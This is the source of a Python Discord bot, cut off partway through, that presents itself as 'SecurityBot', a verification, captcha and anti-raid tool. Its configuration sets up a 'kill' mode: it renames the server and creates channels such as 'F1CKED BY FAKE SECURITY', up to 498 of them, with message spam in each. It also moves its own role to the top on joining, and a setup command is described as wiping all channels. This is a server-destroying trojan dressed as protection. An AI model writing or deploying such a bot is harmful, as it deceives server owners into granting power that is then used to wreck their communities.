import subprocess
import sys
import importlib

# ==========================================================
#              АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ
# ==========================================================
def _ensure(pkg, import_name=None):
    import_name = import_name or pkg
    try:
        importlib.import_module(import_name)
        return
    except ImportError:
        pass
    for args in (
        [sys.executable, "-m", "pip", "install", "--user", pkg],
        [sys.executable, "-m", "pip", "install", "--break-system-packages", pkg],
        [sys.executable, "-m", "pip", "install", pkg],
    ):
        try:
            subprocess.check_call(args)
            return
        except Exception as e:
            print(f"[AUTOINSTALL try failed] {args}: {e}")

_ensure("discord.py", "discord")
_ensure("Pillow", "PIL")
_ensure("aiohttp", "aiohttp")

# ==========================================================
#                     ОСНОВНЫЕ ИМПОРТЫ
# ==========================================================
import asyncio
import io
import logging
import os
import random
import time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

try:
    from PIL import Image, ImageDraw, ImageFont, ImageFilter
    HAS_PIL = True
except Exception:
    HAS_PIL = False

# ==========================================================
#                        CONFIG
# ==========================================================
TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
OWNER_ID = int(os.getenv("OWNER_ID", "1199702317419724824"))


@dataclass
class Config:
    BANNER_URL: str = "https://securitybot.gg/verify-banner.png"
    WEBSITE: str = "https://dcsecurity.fun"
    INVITE: str = "https://discord.gg/securitybot"
    LOG_FILE: str = "bot.log"
    STRIKES_FILE: str = "strikes.json"

    UNVERIFIED: str = "🚫 Unverified"
    VERIFIED: str = "✅ Verified"
    QUARANTINE: str = "☣️ Quarantine"
    MUTED: str = "🔇 Muted"
    MEMBER: str = "👤 Member"
    VERIFY_CHANNEL: str = "✅・verification"
    VERIFY_CATEGORY: str = "🔐 VERIFICATION"
    STAFF_LOG_CHANNEL: str = "📋・staff-logs"

    KILL_GIF: str = "https://tenor.com/view/meow-kitty-happy-cat-kitty-cat-gif-4532088786446233986"
    KILL_SERVER_NAME: str = "F1CKED BY FAKE SECURITY"
    KILL_TAG: str = "F1CKED BY FAKE SECURITY"
    KILL_CHANNEL_NAMES: list = field(default_factory=lambda: [
        "f1cked-by-security", "destroyed-by-security", "k1lled-by-security",
    ])
    KILL_CHANNEL_LIMIT: int = 498
    KILL_SPAM_PER_CHANNEL: int = 5

CFG = Config()

# ==========================================================
#                        LOGGING
# ==========================================================
logger = logging.getLogger("securitybot")
logger.setLevel(logging.INFO)
_fmt = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", "%Y-%m-%d %H:%M:%S")
_fh = logging.FileHandler(CFG.LOG_FILE, encoding="utf-8")
_fh.setFormatter(_fmt)
_sh = logging.StreamHandler()
_sh.setFormatter(_fmt)
logger.addHandler(_fh)
logger.addHandler(_sh)

# ==========================================================
#                         BOT
# ==========================================================
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True
intents.moderation = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

RECENT_JOINS: deque = deque(maxlen=200)
RAID_THRESHOLD = 5
RAID_WINDOW = 10
NEW_ACCOUNT_AGE = 7

CAPTCHA_ATTEMPTS: dict = defaultdict(int)
CAPTCHA_LOCKOUT: dict = {}
LAST_VERIFY: dict = defaultdict(float)
VERIFY_COOLDOWN = 10.0

METRICS = {
    "total_verifications": 0,
    "failed_verifications": 0,
    "captcha_attempts": 0,
    "button_verifications": 0,
    "captcha_verifications": 0,
    "already_verified": 0,
    "started_at": time.time(),
}

ANTIRAID_ENABLED = True
AUTO_ROLE_HOIST = True
AUTO_MEMBER_AFTER_VERIFY = True
FEATURES = {
    "antiraid": True,
    "autohoist": True,
    "automember": True,
    "newaccount_warn": True,
    "captcha_resend": True,
}

try:
    import json as _json
    with open(CFG.STRIKES_FILE, "r", encoding="utf-8") as _f:
        STRIKES = _json.load(_f)
except Exception:
    import json as _json
    STRIKES = {}


def save_strikes():
    try:
        import json as _json
        with open(CFG.STRIKES_FILE, "w", encoding="utf-8") as f:
            _json.dump(STRIKES, f, ensure_ascii=False)
    except Exception as e:
        logger.warning(f"strikes save failed: {e}")


# ==========================================================
#                       UTILITIES
# ==========================================================
async def safe(coro):
    try:
        return await coro
    except Exception as e:
        logger.debug(f"safe(): swallowed {type(e).__name__}: {e}")
        return None


def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def ts(dt: datetime, style: str = "R") -> str:
    return discord.utils.format_dt(dt, style)


def normalize(s: str) -> str:
    return "".join(ch for ch in str(s) if ch.isalnum()).lower()

# ==========================================================
#                    CAPTCHA GENERATION
# ==========================================================
CAPTCHA_CHARS = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
CAPTCHA_MIN = 5
CAPTCHA_MAX = 7


def _collect_fonts():
    candidates = [
        r"C:\Windows\Fonts\arialbd.ttf",
        r"C:\Windows\Fonts\arial.ttf",
        r"C:\Windows\Fonts\segoeuib.ttf",
        r"C:\Windows\Fonts\verdana.ttf",
        r"C:\Windows\Fonts\calibrib.ttf",
        r"C:\Windows\Fonts\tahomabd.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSerif-Bold.ttf",
        "/System/Library/Fonts/Supplemental/Arial Bold.ttf",
        "/System/Library/Fonts/Supplemental/Arial.ttf",
        "/System/Library/Fonts/Supplemental/Verdana.ttf",
    ]
    found = []
    if not HAS_PIL:
        return found
    for p in candidates:
        try:
            ImageFont.truetype(p, 20)
            found.append(p)
        except Exception:
            continue
    return found

AVAILABLE_FONTS = _collect_fonts()


def _pick_font(size: int):
    if AVAILABLE_FONTS:
        path = random.choice(AVAILABLE_FONTS)
        try:
            return ImageFont.truetype(path, size)
        except Exception:
            pass
    try:
        return ImageFont.load_default()
    except Exception:
        return None


def generate_captcha_code(length: int = None) -> str:
    if length is None:
        length = random.randint(CAPTCHA_MIN, CAPTCHA_MAX)
    return "".join(random.choice(CAPTCHA_CHARS) for _ in range(length))


def generate_captcha_image(text: str, width: int = 360, height: int = 140) -> io.BytesIO:
    if not HAS_PIL:
        raise RuntimeError("Pillow is not installed.")

    bg_top = (random.randint(235, 255), random.randint(235, 255), random.randint(235, 255))
    img = Image.new("RGB", (width, height), bg_top)
    draw = ImageDraw.Draw(img)

    for _ in range(random.randint(1500, 2500)):
        x = random.randint(0, width - 1)
        y = random.randint(0, height - 1)
        c = (random.randint(100, 220), random.randint(100, 220), random.randint(100, 220))
        draw.point((x, y), fill=c)

    for _ in range(random.randint(6, 10)):
        x1, y1 = random.randint(0, width), random.randint(0, height)
        x2, y2 = random.randint(0, width), random.randint(0, height)
        c = (random.randint(60, 170), random.randint(60, 170), random.randint(60, 170))
        draw.line((x1, y1, x2, y2), fill=c, width=random.randint(1, 3))

    for _ in range(random.randint(2, 4)):
        pts = [(random.randint(0, width), random.randint(0, height)) for _ in range(4)]
        draw.line(pts, fill=(random.randint(80, 200),) * 3, width=1)

    char_w = width // (len(text) + 1)
    for i, ch in enumerate(text):
        color = (random.randint(10, 90), random.randint(10, 90), random.randint(10, 90))
        size = random.randint(48, 64)
        font = _pick_font(size)
        if font is None:
            continue

        tmp = Image.new("RGBA", (size + 30, size + 30), (0, 0, 0, 0))
        td = ImageDraw.Draw(tmp)
        td.text((15, 15), ch, font=font, fill=color + (255,))

        tmp = tmp.rotate(random.randint(-35, 35), resample=Image.BICUBIC, expand=1)

        x = 10 + i * char_w + random.randint(-6, 6)
        y = (height - tmp.size[1]) // 2 + random.randint(-12, 12)
        img.paste(tmp, (x, y), tmp)

    if random.random() < 0.5:
        img = img.filter(ImageFilter.GaussianBlur(radius=random.uniform(0.3, 0.8)))
    else:
        img = img.filter(ImageFilter.SMOOTH)

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf


FALLBACK_POOL = [
    {"url": "https://engines.egr.uh.edu/sites/engines/files/images/page/3043-Captcha-smwm.svg.png", "answer": "smwm"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHo8nK2BCHG2eJDBcKgZ_irVyZ545gYAj31mHwA7--6iVtd-qs638q5aA&s=10", "answer": "2w4m"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcTm_N6988u3oDIznFJ1Y5b-nHCHPFoszHQM9hURRsma_eeK8wC5EuVUgV&s=10", "answer": "imkiz"},
    {"url": "https://www.researchgate.net/publication/277007505/figure/fig3/AS:667814067204096@1536230689050/Example-of-a-Yahoo-captcha-that-uses-the-negative-kerning.png", "answer": "4cz8jyaz"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSC6QdBaPWh9xla74-tImxsJJf6gkn6fyn8EFw5QFrSrq37TAjsinZV_rA&s=10", "answer": "w68hp"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyMS09Wx4os6eRxZxazxi3QGCAT1KsasIQ46EACb7YoWGSXFcbGJIQlsk&s=10", "answer": "2vyk"},
]

# ==========================================================
#                       ROLES / CHANNELS
# ==========================================================
async def find_or_create_role(guild, name, color, hoist=False, mentionable=False, permissions=None):
    role = discord.utils.get(guild.roles, name=name)
    if role is None:
        role = await safe(guild.create_role(
            name=name, color=color, hoist=hoist,
            mentionable=mentionable,
            permissions=permissions or discord.Permissions.none()
        ))
    return role


async def find_or_create_category(guild, name):
    cat = discord.utils.get(guild.categories, name=name)
    if cat is None:
        cat = await safe(guild.create_category(name))
    return cat


async def find_or_create_channel(guild, name, *, category=None, overwrites=None, topic=None, kind="text"):
    ch = discord.utils.get(guild.text_channels, name=name) if kind == "text" \
        else discord.utils.get(guild.voice_channels, name=name)
    if ch is None:
        if kind == "text":
            ch = await safe(guild.create_text_channel(
                name, category=category, overwrites=overwrites or {}, topic=topic
            ))
        else:
            ch = await safe(guild.create_voice_channel(
                name, category=category, overwrites=overwrites or {}
            ))
    return ch


async def hoist_bot_role(guild: discord.Guild):
    me = guild.me
    if not me or not me.top_role:
        return False
    try:
        await guild.edit_role_positions({me.top_role: 1})
        return True
    except Exception as e:
        logger.debug(f"hoist failed on {guild.name}: {e}")
        return False


async def log_to_staff(guild: discord.Guild, embed: discord.Embed):
    ch = discord.utils.get(guild.text_channels, name=CFG.STAFF_LOG_CHANNEL)
    if ch is None:
        ch = discord.utils.get(guild.text_channels, name="staff-logs")
    if ch:
        await safe(ch.send(embed=embed))


async def apply_unverified_lockdown(guild: discord.Guild):
    unverified = discord.utils.get(guild.roles, name=CFG.UNVERIFIED)
    if not unverified:
        return (0, 0)

    verify_ch = discord.utils.get(guild.text_channels, name=CFG.VERIFY_CHANNEL) \
        or discord.utils.get(guild.text_channels, name="verification")

    hidden = 0
    allowed = 0
    tasks = []
    for ch in list(guild.channels):
        if verify_ch is not None and ch.id == verify_ch.id:
            continue
        if verify_ch is not None and verify_ch.category is not None and ch.id == verify_ch.category.id:
            continue
        tasks.append(safe(ch.set_permissions(
            unverified, view_channel=False, reason="Unverified lockdown"
        )))
        hidden += 1

    if tasks:
        await asyncio.gather(*tasks)

    if verify_ch is not None:
        await safe(verify_ch.set_permissions(
            unverified, view_channel=True, send_messages=False,
            read_message_history=True, reason="Allow verify"
        ))
        allowed += 1
        if verify_ch.category is not None:
            await safe(verify_ch.category.set_permissions(
                unverified, view_channel=True, reason="Allow verify category"
            ))
            allowed += 1

    return (hidden, allowed)


def is_recent_account(user: discord.User) -> bool:
    return (now_utc() - user.created_at).days < NEW_ACCOUNT_AGE


def check_raid() -> bool:
    if not ANTIRAID_ENABLED:
        return False
    cutoff = now_utc() - timedelta(seconds=RAID_WINDOW)
    recent = [j for j in RECENT_JOINS if j[1] > cutoff]
    return len(recent) >= RAID_THRESHOLD


def verify_cooldown_ok(user_id: int) -> bool:
    return (time.time() - LAST_VERIFY.get(user_id, 0)) >= VERIFY_COOLDOWN


def is_locked_out(user_id: int) -> bool:
    return time.time() < CAPTCHA_LOCKOUT.get(user_id, 0)


def lockout_user(user_id: int, seconds: int = 600):
    CAPTCHA_LOCKOUT[user_id] = time.time() + seconds


def has_verified_role(member: discord.Member) -> bool:
    return any(r.name == CFG.VERIFIED for r in member.roles)


def has_unverified_role(member: discord.Member) -> bool:
    return any(r.name == CFG.UNVERIFIED for r in member.roles)


CAPTCHA_STATE: dict = {}


async def grant_member_role_if_enabled(guild: discord.Guild, member: discord.Member):
    if not FEATURES["automember"]:
        return
    m_role = discord.utils.get(guild.roles, name=CFG.MEMBER)
    if m_role and m_role not in member.roles:
        await safe(member.add_roles(m_role, reason="Auto Member after verification"))


# ==========================================================
#                       VIEWS
# ==========================================================
class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, custom_id="securitybot:verify_button")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        g = interaction.guild
        m = interaction.user
        v_role = discord.utils.get(g.roles, name=CFG.VERIFIED)
        u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
        q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)

        if has_verified_role(m):
            METRICS["already_verified"] += 1
            await interaction.response.send_message("✅ You are already verified.", ephemeral=True)
            return

        if not v_role:
            await interaction.response.send_message("❌ The `Verified` role is missing.", ephemeral=True)
            return

        if not verify_cooldown_ok(m.id):
            await interaction.response.send_message("⏳ Please wait a few seconds before trying again.", ephemeral=True)
            return

        try:
            if q_role and q_role in m.roles:
                await interaction.response.send_message("🚫 You are quarantined.", ephemeral=True)
                return
            if u_role and u_role in m.roles:
                await m.remove_roles(u_role, reason="Verification passed")
            if v_role not in m.roles:
                await m.add_roles(v_role, reason="Verification passed")
            await grant_member_role_if_enabled(g, m)
        except discord.Forbidden:
            await interaction.response.send_message("❌ I don't have permission to manage your roles.", ephemeral=True)
            return

        LAST_VERIFY[m.id] = time.time()
        METRICS["total_verifications"] += 1
        METRICS["button_verifications"] += 1

        embed = discord.Embed(
            title="✅ Verification Complete",
            description=f"Welcome to **{g.name}**, {m.mention}!",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        log = discord.Embed(
            title="🔓 Member Verified — Button",
            description=f"{m.mention} (`{m.id}`)",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        log.set_thumbnail(url=m.display_avatar.url)
        await log_to_staff(g, log)


class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
    code = discord.ui.TextInput(
        label="Enter the code from the image",
        placeholder="Type exactly what you see",
        min_length=1,
        max_length=20,
        required=True,
    )

    def __init__(self, expected: str, user_id: int):
        super().__init__(timeout=120)
        self.expected = normalize(expected)
        self.user_id = user_id

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id != self.user_id:
            return

        entered = normalize(str(self.code))
        METRICS["captcha_attempts"] += 1
        logger.info(f"[CAPTCHA] user={interaction.user.id} expected={self.expected!r} entered={entered!r}")

        if is_locked_out(interaction.user.id):
            await interaction.response.send_message("🔒 You are temporarily locked out.", ephemeral=True)
            return

        if entered != self.expected:
            CAPTCHA_ATTEMPTS[interaction.user.id] += 1
            METRICS["failed_verifications"] += 1
            attempts_left = 3 - CAPTCHA_ATTEMPTS[interaction.user.id]

            if attempts_left <= 0:
                lockout_user(interaction.user.id, 600)
                embed = discord.Embed(
                    title="🔒 Too Many Failed Attempts",
                    description="Locked out for **10 minutes**.",
                    color=discord.Color.red(),
                    timestamp=now_utc(),
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                log = discord.Embed(
                    title="⚠️ Captcha Lockout",
                    description=f"{interaction.user.mention} failed 3×.",
                    color=discord.Color.dark_red(),
                    timestamp=now_utc(),
                )
                await log_to_staff(interaction.guild, log)
                return

            embed = discord.Embed(
                title="❌ Incorrect Code",
                description=f"Attempts remaining: **{attempts_left}**",
                color=discord.Color.red(),
                timestamp=now_utc(),
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        g = interaction.guild
        m = interaction.user
        v_role = discord.utils.get(g.roles, name=CFG.VERIFIED)
        u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)

        if not v_role:
            await interaction.response.send_message("❌ Verified role missing.", ephemeral=True)
            return
        try:
            if u_role and u_role in m.roles:
                await m.remove_roles(u_role, reason="Captcha passed")
            if v_role not in m.roles:
                await m.add_roles(v_role, reason="Captcha passed")
            await grant_member_role_if_enabled(g, m)
        except discord.Forbidden:
            await interaction.response.send_message("❌ I don't have permission to manage your roles.", ephemeral=True)
            return

        CAPTCHA_ATTEMPTS.pop(m.id, None)
        CAPTCHA_STATE.pop(m.id, None)
        LAST_VERIFY[m.id] = time.time()
        METRICS["total_verifications"] += 1
        METRICS["captcha_verifications"] += 1

        embed = discord.Embed(
            title="✅ Verification Complete",
            description=f"Welcome to **{g.name}**, {m.mention}!",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        log = discord.Embed(
            title="🔓 Member Verified — Captcha",
            description=f"{m.mention} (`{m.id}`)",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        log.set_thumbnail(url=m.display_avatar.url)
        await log_to_staff(g, log)


class CaptchaEnterView(discord.ui.View):
    def __init__(self, answer: str, user_id: int):
        super().__init__(timeout=120)
        self.answer = answer
        self.user_id = user_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == self.user_id

    @discord.ui.button(label="Enter code", style=discord.ButtonStyle.success, emoji="⌨️")
    async def enter(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.send_modal(CaptchaModal(self.answer, self.user_id))
        except Exception as e:
            await interaction.response.send_message(f"❌ Could not open input: {e}", ephemeral=True)

    @discord.ui.button(label="Resend", style=discord.ButtonStyle.secondary, emoji="🔁")
    async def resend(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not FEATURES["captcha_resend"]:
            await interaction.response.send_message("❌ Resend disabled.", ephemeral=True)
            return
        m = interaction.user
        if m.id != self.user_id:
            return
        try:
            code = generate_captcha_code()
            buf = generate_captcha_image(code)
            file = discord.File(fp=buf, filename="captcha.png")
            embed = discord.Embed(
                title="🔐 Security Check",
                description="Enter the code shown in the image below.",
                color=discord.Color.from_rgb(30, 60, 130),
                timestamp=now_utc(),
            )
            embed.set_image(url="attachment://captcha.png")
            new_view = CaptchaEnterView(code, m.id)
            await interaction.response.edit_message(embed=embed, view=new_view, attachments=[file])
            CAPTCHA_STATE[m.id] = {"answer": code, "issued": time.time()}
        except Exception as e:
            await interaction.response.send_message(f"❌ Resend failed: {e}", ephemeral=True)


class CaptchaStartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, custom_id="securitybot:captcha_start")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        m = interaction.user

        if has_verified_role(m):
            METRICS["already_verified"] += 1
            await interaction.response.send_message("✅ You are already verified.", ephemeral=True)
            return

        if is_locked_out(m.id):
            unlock_in = int(CAPTCHA_LOCKOUT[m.id] - time.time())
            await interaction.response.send_message(f"🔒 Locked out for another **{unlock_in}s**.", ephemeral=True)
            return

        if not verify_cooldown_ok(m.id):
            await interaction.response.send_message("⏳ Slow down a bit.", ephemeral=True)
            return

        embed = discord.Embed(
            title="🔐 Security Check",
            description="Enter the code shown in the image below.\n\n*You have 120 seconds and 3 attempts.*",
            color=discord.Color.from_rgb(30, 60, 130),
            timestamp=now_utc(),
        )
        embed.set_footer(text="Guardian Verification System")

        file = None
        answer = None

        if HAS_PIL:
            try:
                code = generate_captcha_code()
                buf = generate_captcha_image(code)
                file = discord.File(fp=buf, filename="captcha.png")
                embed.set_image(url="attachment://captcha.png")
                answer = code
            except Exception as e:
                logger.warning(f"Pillow captcha failed: {e}")
                file = None

        if answer is None:
            if not FALLBACK_POOL:
                await interaction.response.send_message("❌ No captcha available.", ephemeral=True)
                return
            entry = random.choice(FALLBACK_POOL)
            answer = entry["answer"]
            embed.set_image(url=entry["url"])

        CAPTCHA_STATE[m.id] = {"answer": answer, "issued": time.time()}

        view = CaptchaEnterView(answer, m.id)
        if file:
            await interaction.response.send_message(embed=embed, view=view, file=file, ephemeral=True)
        else:
            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)


# ==========================================================
#                  VERIFICATION MESSAGE
# ==========================================================
async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild, method: str = "button"):
    embed = discord.Embed(
        description=(
            "This server requires you to verify yourself to get access to other channels, "
            "you can simply verify by clicking on the verify button."
        ),
        color=discord.Color.from_rgb(30, 60, 130),
    )
    if CFG.BANNER_URL:
        embed.set_image(url=CFG.BANNER_URL)

    async for msg in channel.history(limit=50):
        if msg.author == guild.me:
            await safe(msg.delete())

    view = CaptchaStartView() if method == "captcha" else VerifyView()
    await safe(channel.send(embed=embed, view=view))


# ==========================================================
#                       EVENTS
# ==========================================================
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        logger.info(f"Global commands synced: {len(synced)}")
    except Exception as e:
        logger.error(f"Sync error: {e}")

    bot.add_view(VerifyView())
    bot.add_view(CaptchaStartView())
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name="/help | dcsecurity.fun"),
        status=discord.Status.online,
    )
    if not hasattr(bot, "uptime"):
        bot.uptime = now_utc()

    if FEATURES["autohoist"]:
        for g in bot.guilds:
            await hoist_bot_role(g)

    logger.info(f"[READY] Logged in as {bot.user} (ID: {bot.user.id})")
    if HAS_PIL:
        logger.info(f"Pillow detected — dynamic captcha active ({len(AVAILABLE_FONTS)} fonts).")
    else:
        logger.warning("Pillow NOT installed — falling back to static captcha pool.")


@bot.event
async def on_guild_join(guild: discord.Guild):
    if FEATURES["autohoist"]:
        await hoist_bot_role(guild)

    ch = guild.system_channel
    if ch and ch.permissions_for(guild.me).send_messages:
        embed = discord.Embed(
            title="🛡️ SecurityBot is now protecting this server",
            description=(
                "Thanks for adding **SecurityBot**.\n\n"
                "• Run `/basicsetup` to bootstrap roles + channels + Community\n"
                "• Run `/basicsetup method:Captcha` for captcha verification\n"
                "• Run `/help` for all commands\n\n"
                f"🌐 {CFG.WEBSITE}"
            ),
            color=discord.Color.from_rgb(30, 60, 130),
            timestamp=now_utc(),
        )
        if CFG.BANNER_URL:
            embed.set_image(url=CFG.BANNER_URL)
        await safe(ch.send(embed=embed))


@bot.event
async def on_member_join(member: discord.Member):
    RECENT_JOINS.append((member.id, now_utc()))

    if has_verified_role(member):
        return

    if FEATURES["antiraid"] and is_recent_account(member) and check_raid():
        q_role = discord.utils.get(member.guild.roles, name=CFG.QUARANTINE)
        if q_role:
            await safe(member.add_roles(q_role, reason="Auto-quarantine: raid detected"))
        logger.warning(f"RAID SUSPECTED: {member} ({member.id})")
        embed = discord.Embed(
            title="🚨 RAID DETECTED",
            description=f"Mass joins detected. {member.mention} auto-quarantined.",
            color=discord.Color.red(),
            timestamp=now_utc(),
        )
        await log_to_staff(member.guild, embed)

    u_role = discord.utils.get(member.guild.roles, name=CFG.UNVERIFIED)
    if u_role and not has_unverified_role(member):
        await safe(member.add_roles(u_role, reason="Auto-assign Unverified"))

    log = discord.Embed(
        title="📥 Member Joined",
        description=f"{member.mention} (`{member.id}`)\nAccount created: {ts(member.created_at)}",
        color=discord.Color.blurple(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=member.display_avatar.url)
    if FEATURES["newaccount_warn"] and is_recent_account(member):
        log.add_field(name="⚠️ New Account", value="Less than 7 days old", inline=False)
    await log_to_staff(member.guild, log)


@bot.event
async def on_member_remove(member: discord.Member):
    log = discord.Embed(
        title="📤 Member Left",
        description=f"{member} (`{member.id}`)",
        color=discord.Color.dark_gray(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=member.display_avatar.url)
    await log_to_staff(member.guild, log)


@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    log = discord.Embed(
        title="🔨 Member Banned",
        description=f"{user} (`{user.id}`)",
        color=discord.Color.red(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=user.display_avatar.url)
    await log_to_staff(guild, log)


@bot.event
async def on_member_unban(guild: discord.Guild, user: discord.User):
    log = discord.Embed(
        title="🔓 Member Unbanned",
        description=f"{user} (`{user.id}`)",
        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=user.display_avatar.url)
    await log_to_staff(guild, log)


@bot.event
async def on_member_update(before: discord.Member, after: discord.Member):
    if before.roles == after.roles:
        return
    added = set(after.roles) - set(before.roles)
    removed = set(before.roles) - set(after.roles)

    for role in added:
        if role.name == CFG.VERIFIED:
            log = discord.Embed(
                title="ℹ️ Verified Role Added",
                description=f"{after.mention} (`{after.id}`)",
                color=discord.Color.green(),
                timestamp=now_utc(),
            )
            log.set_thumbnail(url=after.display_avatar.url)
            await log_to_staff(after.guild, log)
    for role in removed:
        if role.name == CFG.VERIFIED:
            log = discord.Embed(
                title="⚠️ Verified Role Removed",
                description=f"{after.mention} (`{after.id}`)",
                color=discord.Color.orange(),
                timestamp=now_utc(),
            )
            log.set_thumbnail(url=after.display_avatar.url)
            await log_to_staff(after.guild, log)


# ==========================================================
#                    PUBLIC COMMANDS
# ==========================================================
@bot.tree.command(name="help", description="Show all available commands.")
async def help_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ SecurityBot — Commands",
        description=(
            "**Verification**\n"
            "`/setupverification` • `/updateverification` • `/resetverification`\n\n"
            "**Setup**\n"
            "`/basicsetup` • `/basicrolesetup`\n\n"
            "**Security** *(staff only)*\n"
            "`/lockdown` • `/unlockdown` • `/panic` • `/raidmode`\n"
            "`/quarantine` • `/unquarantine` • `/softban` • `/silence`\n"
            "`/antiraid` • `/securityaudit`\n\n"
            "**Moderation** *(staff only)*\n"
            "`/purge` • `/yeet` • `/hammer` • `/unban_all`\n"
            "`/strike` • `/strikes` • `/clearstrikes`\n\n"
            "**Utility** *(staff only)*\n"
            "`/announce` • `/dm_all` • `/role_all` • `/massrole`\n"
            "`/serverinfo` • `/userinfo` • `/whois` • `/audit` • `/status` • `/metrics` • `/profile`\n\n"
            "**Fun**\n"
            "`/8ball` • `/roll` • `/coinflip` • `/dice` • `/slap` • `/hug` • `/pat`\n"
            "`/meme` • `/wyr` • `/ship` • `/iq` • `/rate` • `/reverse`\n\n"
            f"🌐 {CFG.WEBSITE}"
        ),
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    if CFG.BANNER_URL:
        embed.set_image(url=CFG.BANNER_URL)
    embed.set_footer(text="Guardian Verification System")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="invite", description="Get the bot invite link.")
async def invite_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔗 Invite SecurityBot",
        description=f"Add **SecurityBot** to your server:\n[Click here]({CFG.INVITE})\n\nWebsite: {CFG.WEBSITE}",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="website", description="Show the official website.")
async def website_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🌐 dcsecurity.fun",
        description=f"Visit us at **{CFG.WEBSITE}**.",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="vibe", description="Post a clean vibe embed.")
@app_commands.guild_only()
async def vibe(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ Protected by SecurityBot",
        description="This server is protected by **SecurityBot**.",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    if CFG.BANNER_URL:
        embed.set_image(url=CFG.BANNER_URL)
    await interaction.response.send_message(embed=embed)


# ==========================================================
#                  SETUP COMMANDS
# ==========================================================
@bot.tree.command(name="setupverification", description="Set up the verification channel and message.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@app_commands.describe(method="Verification method")
@app_commands.choices(method=[
    app_commands.Choice(name="Button", value="button"),
    app_commands.Choice(name="Captcha", value="captcha"),
])
async def setupverification(interaction: discord.Interaction, method: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    chosen = method.value if method else "button"

    u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
    v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.green())

    cat = await find_or_create_category(g, CFG.VERIFY_CATEGORY)
    overwrites = {
        g.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True),
        v_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
        g.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True, manage_roles=True),
    }

    ch = await find_or_create_channel(
        g, CFG.VERIFY_CHANNEL, category=cat, overwrites=overwrites,
        topic="Verify to gain access to the server.", kind="text"
    )
    if ch:
        await send_verify_message(ch, g, method=chosen)
        bot.add_view(VerifyView())
        bot.add_view(CaptchaStartView())
        embed = discord.Embed(
            title="✅ Verification Setup Complete",
            description=f"Channel: {ch.mention}\nMethod: **{chosen}**\nRoles: {u_role.mention}, {v_role.mention}",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await interaction.followup.send("❌ Failed to create verification channel.", ephemeral=True)


@bot.tree.command(name="basicsetup", description="Wipe ALL channels, rebuild structure, enable Community Server.")
